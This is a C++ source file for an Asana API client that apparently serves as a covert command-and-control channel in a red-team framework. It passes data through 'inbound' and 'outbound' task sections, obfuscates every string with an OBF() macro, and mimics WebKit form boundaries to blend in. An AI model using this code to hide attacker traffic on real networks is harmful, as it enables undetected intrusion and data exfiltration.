#include "stdafx.h"
#include "AsanaApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace {
	std::wstring ToWideString(std::string const& str) {
		return Convert<Utf16>(str);
	}
}

FSecure::AsanaApi::AsanaApi(std::string const& token, std::string const& projectId, std::string const& inboundDirectionName, std::string const& outboundDirectionName) {
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_Token = token;
	this->m_ProjectId = projectId;

	this->m_SectionIdInbound = GetOrCreateSectionIdByName(inboundDirectionName);
	this->m_SectionIdOutbound = GetOrCreateSectionIdByName(outboundDirectionName);
}

std::string FSecure::AsanaApi::CreateTask(std::string const& taskName, std::string const& body) {
	assert(body.size() < 65'535);
	std::string url = OBF("https://app.asana.com/api/1.0/tasks/");
	json j;
	j[OBF("data")][OBF("name")] = taskName;
	j[OBF("data")][OBF("notes")] = body;
	j[OBF("data")][OBF("projects")] = json::array({ this->m_ProjectId });
	j[OBF("data")][OBF("memberships")] = json::array({ json::object({ {OBF("project"), this->m_ProjectId}, {OBF("section"), this->m_SectionIdOutbound} }) });
	json response = SendJsonRequest(url, j, Method::POST);
	return response[OBF("data")][OBF("gid")];
}

std::string FSecure::AsanaApi::CreateTaskWithAttachment(std::string const& taskName, std::vector<uint8_t> const& attachmentBody, std::string const& attachmentFileName, std::string const& attachmentMimeType) {
	assert(attachmentBody.size() < 104'857'600); // attachments are limited to 100 MB
	// Create new, empty task
	std::string taskId = CreateTask(taskName + OBF(":writing"), "");
	// Add attachment
	AddAttachmentToTask(taskId, attachmentBody, attachmentFileName, attachmentMimeType);
	// Rename task to indicate it's ready
	RenameTask(taskId, taskName);
	return taskId;
}

std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>, bool>> FSecure::AsanaApi::GetTasks() {
	std::string url = OBF("https://app.asana.com/api/1.0/sections/") + this->m_SectionIdInbound + OBF("/tasks?opt_fields=name,notes,created_at,attachments");
	json response = SendJsonRequest(url, NULL, Method::GET);

	std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>, bool>> ret;
	for (auto& task : response[OBF("data")]) {
		std::string taskName = task[OBF("name")];
		if (taskName.find(OBF(":writing")) == std::string::npos) { // make sure ':writing' is not in the task name
			std::string taskId = task[OBF("gid")];
			std::string creationTimestamp = task[OBF("created_at")];
			std::vector<uint8_t> body;
			bool dataFromAttachment;
			if (task[OBF("attachments")].empty()) {
				// No attachments in task, so the body is in the "notes" attribute
				std::string notes = task[OBF("notes")];
				body = std::vector<uint8_t>(std::make_move_iterator(notes.begin()), std::make_move_iterator(notes.end()));
				dataFromAttachment = false;
			} else {
				// Attachment found! Body is in the attachment.
				std::string attachmentId = task[OBF("attachments")][0][OBF("gid")];
				body = GetAttachmentById(attachmentId);
				dataFromAttachment = true;
			}
			ret.emplace_back(std::make_tuple(std::move(taskId), std::move(creationTimestamp), std::move(body), std::move(dataFromAttachment)));
		}
	}
	return ret;
}

void FSecure::AsanaApi::DeleteTask(std::string const& taskId) {
	std::string url = OBF("https://app.asana.com/api/1.0/tasks/") + taskId;
	SendJsonRequest(url, NULL, Method::DEL);
}

std::string FSecure::AsanaApi::GetOrCreateSectionIdByName(std::string const& sectionName) {
	// Check if the section already exists
	std::string sectionId = GetSectionIdByName(sectionName);
	if (sectionId.empty()) {
		// If section does not exist, create it.
		sectionId = CreateSectionIdByName(sectionName);
	}
	return sectionId;
}

std::string FSecure::AsanaApi::GetSectionIdByName(std::string const& sectionName) {
	std::string url = OBF("https://app.asana.com/api/1.0/projects/") + this->m_ProjectId + OBF("/sections");
	json response = SendJsonRequest(url, NULL, Method::GET);
	for (auto& section : response[OBF("data")]) {
		std::string name = section[OBF("name")];
		if (name == sectionName) {
			return section[OBF("gid")];
		}
	}
	return "";
}

std::string FSecure::AsanaApi::CreateSectionIdByName(std::string const& sectionName) {
	std::string url = OBF("https://app.asana.com/api/1.0/projects/") + this->m_ProjectId + OBF("/sections");
	json body;
	body[OBF("data")][OBF("name")] = sectionName;
	json response = SendJsonRequest(url, body, Method::POST);
	return response[OBF("data")][OBF("gid")];
}

std::string FSecure::AsanaApi::AddAttachmentToTask(std::string const& taskId, std::vector<uint8_t> const& attachmentBody, std::string const& attachmentFileName, std::string const& attachmentMimeType) {
	std::string url = OBF("https://app.asana.com/api/1.0/tasks/") + taskId + OBF("/attachments");
	// Generating body
	const std::string boundary_prefix(OBF("------WebKitFormBoundary")); // Mimicking WebKit
	const std::string alphabet(OBF("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"));
	std::string boundary = boundary_prefix;
	for (int i = 0; i < 16; i++) { // Generate random boundary string
		boundary.push_back(alphabet[rand() % alphabet.size()]);
	}
	// Building the multipart body (prefix + attachment + suffix)
	std::vector<uint8_t> body;
	std::string bodyPrefix = OBF("\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"file\"; filename=\"") + attachmentFileName + OBF("\"") + OBF("\r\n");
	bodyPrefix += OBF("Content-Type: ") + attachmentMimeType + OBF("\r\n\r\n");
	body.insert(body.begin(), bodyPrefix.begin(), bodyPrefix.end()); // Insert the prefix
	body.insert(body.end(), attachmentBody.begin(), attachmentBody.end()); // Insert the attachment content
	std::string bodySuffix = OBF("\r\n");
	bodySuffix += OBF("--") + boundary + OBF("--") + OBF("\r\n");
	body.insert(body.end(), bodySuffix.begin(), bodySuffix.end()); // Insert the suffix
	// Send HTTP request
	std::string contentType = OBF("multipart/form-data; boundary=") + boundary;
	json response = json::parse(SendHttpRequest(url, { contentType.begin(), contentType.end() }, body, Method::POST));
	return response[OBF("data")][OBF("gid")];
}

void FSecure::AsanaApi::RenameTask(std::string const& taskId, std::string const& newTaskName) {
	std::string url = OBF("https://app.asana.com/api/1.0/tasks/") + taskId;
	json j;
	j[OBF("data")][OBF("name")] = newTaskName;
	SendJsonRequest(url, j, Method::PUT);
}

std::vector<uint8_t> FSecure::AsanaApi::GetAttachmentById(std::string const& attachmentId) {
	// First we need to get the download url (Asana stores its attachments in S3)
	std::string url = OBF("https://app.asana.com/api/1.0/attachments/") + attachmentId;
	json response = SendJsonRequest(url, NULL, Method::GET);
	std::string downloadUrl = response[OBF("data")][OBF("download_url")];
	// Then download the content of the attachment
	std::string::size_type i = downloadUrl.find(OBF("#_=_")); // Got to remove the '#_=_' of the download string (cpprestsdk can't handle this)
	if (i != std::string::npos) {
		downloadUrl.erase(i, 4);
	}
	ByteVector content = SendHttpRequest(downloadUrl, ContentType::Text, {}, Method::GET, false); // Content type will be ignored, since data is empty
	return std::vector<uint8_t>(std::make_move_iterator(content.begin()), std::make_move_iterator(content.end()));
}

FSecure::ByteVector FSecure::AsanaApi::SendHttpRequest(std::string const& host, FSecure::WinHttp::ContentType contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	return SendHttpRequest(host, GetContentType(contentType), data, method, setAuthorizationHeader);
}

FSecure::ByteVector FSecure::AsanaApi::SendHttpRequest(std::string const& host, std::wstring contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	while (true) {
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		if (!data.empty()) {
			request.SetData(contentType, data);
		}

		if (setAuthorizationHeader) { // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
			return resp.GetData();
		} else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		} else {
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

json FSecure::AsanaApi::SendJsonRequest(std::string const& url, json const& data, FSecure::WinHttp::Method method) {
	if (data == NULL) {
		return json::parse(SendHttpRequest(url, ContentType::MultipartFormData, {}, method));
	} else {
		std::string j = data.dump();
		return json::parse(SendHttpRequest(url, ContentType::ApplicationJson, { std::make_move_iterator(j.begin()), std::make_move_iterator(j.end()) }, method));
	}

}
